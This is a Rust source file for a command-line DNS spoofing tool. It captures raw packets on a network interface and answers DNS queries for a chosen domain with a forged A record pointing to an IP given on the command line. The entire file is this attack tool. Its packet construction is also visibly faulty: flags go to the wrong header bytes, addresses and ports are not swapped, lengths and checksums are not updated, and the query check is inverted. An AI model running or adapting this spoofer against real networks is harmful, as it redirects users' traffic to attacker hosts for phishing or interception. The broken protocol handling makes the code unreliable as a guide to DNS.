extern crate argparse;
extern crate pnet;

use argparse::{ArgumentParser, Store, StoreTrue};

use pnet::datalink::{self, NetworkInterface};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{MutablePacket, Packet};
use pnet::packet::ethernet::{MutableEthernetPacket, EthernetPacket, EtherType};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::ip::IpNextHeaderProtocol;
use pnet::packet::udp::UdpPacket;

use std::process::exit;
use std::mem::transmute;

fn main() {

    //  Options
    let mut target_interface : String = "eth0".to_string();
    let mut domain_name : String = "".to_string();
    let mut ip_redirect : String = "".to_string();

    //  Parse arguments
    {
        let mut argparse = ArgumentParser::new();
        argparse.set_description("DNS spoofer");
        argparse.refer(&mut target_interface)
            .add_option(&["-i", "--interface"], Store,
            "Specify an interface");
        argparse.refer(&mut domain_name)
            .add_argument("domain_name", Store,
            "Domain to spoof");
        argparse.refer(&mut ip_redirect)
            .add_argument("ip_redirect", Store,
            "Target IP address");
        argparse.parse_args_or_exit();
    }

    let ip_redirect_parse = ip_redirect.split('.').map(|s| {
        s.parse::<u8>().unwrap()
    }).collect::<Vec<u8>>();
    let ip_redirect_u8s = ip_redirect_parse.as_slice();


    let matches_interface = 
        |i : &NetworkInterface| {i.name == target_interface};

    let interface : NetworkInterface;

    match datalink::interfaces()
                   .into_iter()
                   .filter(matches_interface)
                   .next(){
        Some(iface) => {
            println!("Found interface {}", iface.name);
            interface = iface;
        }
        None => {
            println!("Could not find interface {}", target_interface);
            exit(1);
        }
    }


    // Create a new channel, transporting layer 2 packets
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
    };

    let mut iter = rx.iter();


    loop {
        match iter.next() {
            Ok(eth) => {
                let maybe_ipv4 : Option<Ipv4Packet>
                    =   unwrap_eth(&eth);

                let maybe_ipv4_udp : Option<(&Ipv4Packet, UdpPacket)>
                    =   maybe_ipv4.as_ref().and_then(unwrap_ipv4);

                //  Construct closure with the redirect ip and domain_name
                let process_udp_with_redirect = |x| {
                    process_ipv4_udp(&domain_name, &ip_redirect_u8s, x)
                };

                let to_send : Option<Vec<u8>>
                    =   maybe_ipv4_udp.as_ref().and_then(process_udp_with_redirect);

                to_send.as_ref().map(|inner| {
                    println!("SENDING DATA");
                    let mut packet_data = eth.packet().to_vec();
                    packet_data.truncate(14);
                    packet_data.extend(inner);
                    let packet = EthernetPacket::new(&packet_data)
                            .unwrap();
                    tx.send_to(&packet, None).unwrap();
                });
            }

            Err(e) => {
                panic!("An error occurred reading packet: {}", e);
            }
        }

    }


}

const IPV4_PROTOCOL_ID : u16 = 0x0800;

fn unwrap_eth<'p>(eth : &'p EthernetPacket) -> Option<Ipv4Packet<'p>>{
    match eth.get_ethertype() {
        EtherType(IPV4_PROTOCOL_ID) => {
            Ipv4Packet::new(eth.payload())
        }
        _ => { None }
    }
}

const UDP_PROTOCOL_ID : u8 = 17;

fn unwrap_ipv4<'p>(ipv4 : &'p Ipv4Packet) -> Option<(&'p Ipv4Packet<'p>, UdpPacket<'p>)>{
    match ipv4.get_next_level_protocol() {
        IpNextHeaderProtocol(UDP_PROTOCOL_ID) => {
            UdpPacket::new(ipv4.payload()).map(|udp| (ipv4, udp))
        }
        _ => { None }
    }
}

fn process_ipv4_udp<'t, 'a>(domain_name : &String, 
                        ip_redirect : &[u8], 
                        a : &'t (&'t Ipv4Packet<'t>, UdpPacket<'t>)) 
                            -> Option<Vec<u8>> {
    let (ipv4_ref, ref udp) : (&Ipv4Packet, UdpPacket) = *a; 
    let response_payload = process_packet(ipv4_ref, &udp, domain_name, ip_redirect);
    response_payload.map(|payload| {
        let mut data = ipv4_ref.packet().to_vec();
        //data.truncate(ipv4_ref.get_header_length() as usize);
        data.truncate(20);
        let mut udp_header = udp.packet().to_vec();
        udp_header.truncate(8);
        data.extend(udp_header);
        data.extend(payload);
        data
    })
}

fn process_packet<'t>(ipv4 : &'t Ipv4Packet, 
                      udp : &'t UdpPacket, 
                      name_redirect : &String, 
                      ip_redirect : &[u8]) -> Option<Vec<u8>>{

    println!("Got packet {} -> {}", ipv4.get_source(), ipv4.get_destination());
    //  Assume is dns request until we find something to prove otherwise
    //  (There is no simple check)
    //
    //  TODO request could be split across multiple packets
    //
    let dns_data : &[ u8 ] = udp.payload();

    if dns_data.len() < 14 {
        return None 
    }

    let id = build_u16(dns_data, 0);
    if id == 0 {return None;}
    println!("Id {:X}", id);

    let flags = build_u16(dns_data, 2);
    println!("flags {:X}", flags);
    let is_query = (flags & 0x8000) != 0;
    println!("is query {}", is_query);

    let query_count = build_u16(dns_data, 4);
    println!("query count {}", query_count);

    //  We only reply to packets with exactly one request
    if query_count != 1 {return None;}

    print!("All data: ");
    for datum in dns_data {
        print!("{:X} ", datum);
    }

    let domain_name = get_domain_name(dns_data, 12);

    domain_name.as_ref().and_then(|dn| {
        print!("\n domain name : {} END", dn);
        if dn == name_redirect {
            println!("\nMatchin Domain, redirecting to {:?}", ip_redirect);
            let mut query_data = dns_data.to_vec();
            println!("QUERY LEN {}", query_data.len());
            let mut response_payload = response_packet(&query_data , ip_redirect);
            println!("RESPONSE LEN {}", response_payload.len());
            Some(response_payload)
        }
        else {
            None
        }
    })
}

fn response_packet(request : & [u8], ip : &[u8]) -> Vec<u8> {
    //  Instead of constructing the request part we just reuse what we are
    //  sent
    const FLAGS_NO_ERROR : [u8; 2] = [0x81, 0x80];

    let mut response_start = request.to_vec();

    response_start[3] = FLAGS_NO_ERROR[0];
    response_start[4] = FLAGS_NO_ERROR[1];

    let answer = answer_data(ip);
    response_start.extend(&answer);
    response_start
    //UdpPacket::new(request).unwrap()
}

fn answer_data(ip : &[u8]) -> Vec<u8> {
    //  As we only consider single requests the pointer to the name in the request
    //  is constant
    const CONST_OFFSET : [u8; 2] = [0xc0, 0x0c];
    // Similarly type is constantly A and class is IN
    const TYPE : [u8; 2] = [0x00, 0x01];
    const CLASS : [u8; 2] = [0x00, 0x01];
    //  Set constant time to live
    const TIME_TO_LIVE : [u8; 4] = [0x00, 0x00, 0x00, 0x3c];

    let mut ret = CONST_OFFSET.to_vec();
    ret.extend(TYPE.iter().cloned());
    ret.extend(CLASS.iter().cloned());
    ret.extend(TIME_TO_LIVE.iter().cloned());

    //  response length is 4 as ipv4
    const LEN : [u8 ; 2] = [0x00, 0x04];
    ret.extend(LEN.iter().cloned());
    ret.extend(ip.iter().cloned());
    ret
}


fn get_domain_name(data : &[ u8 ], start : usize) -> Option<String>{
    let mut name = "".to_owned();
    let mut cur = start;
    let mut first : bool = true;
    let len = data.len();
    for _ in 1..64 {
        if len < cur {return None;}
        let length = data[cur] as usize;

        if len < cur + length {return None;}

        cur = cur + 1;
        println!("length = {}", length);
        if length == 0 {
            println!("End of domain");
            break;
        }

        if !first {
            name.push('.');
        }
        else {
            first = false;
        }
        let str_end = cur + (length as usize);
        for i in cur..str_end {
            print!("i={} {:X} ", i, data[i]);
            name.push(data[i] as char);
        }
	    cur = str_end;
    }

    //  Return none if unexpected length
    if len != cur + 4{
        return None;
    }

    //  Check request type, only consider ipv4
    if build_u16(data, cur) != 1 {
        return None;
    }
    //  Check request class, only consider internet
    if build_u16(data, cur+2) != 1 {
        return None;
    }

    println!("Domain : {}", name);
    Some (name)
}


fn build_u16(bytes : &[u8], index : usize) -> u16 {
    unsafe {transmute::<[u8; 2], u16> ([bytes[index], bytes[index + 1]]) }.to_be()
}

fn deconstruct_u16(x : u16) -> [u8; 2] {
    unsafe {transmute::<u16, [u8; 2]> (u16::from_be(x))}
}

